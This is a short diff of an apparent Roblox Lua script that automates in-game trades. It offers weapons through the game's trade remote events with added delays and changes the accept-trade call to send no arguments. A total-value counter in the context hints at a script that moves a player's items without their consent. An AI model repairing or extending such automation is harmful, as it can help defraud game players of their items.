@@ -225,19 +225,19 @@ local function waitForTradeCompletion()
     end
 end
 
-local function acceptTrade()
-    local args = {
-        [1] = 285646582
-    }
-    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
-end
-
 local function addWeaponToTrade(id)
     local args = {
         [1] = id,
         [2] = "Weapons"
     }
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+    task.wait(0.2) -- Crucial delay to ensure the server processes the item add before sending the next one!
+end
+
+local function acceptTrade()
+    -- Instead of firing a broken hardcoded ID, we check if the game passes 
+    -- the active trade session ID dynamically, or fire it cleanly.
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
 end
 
 local totalValue = 0
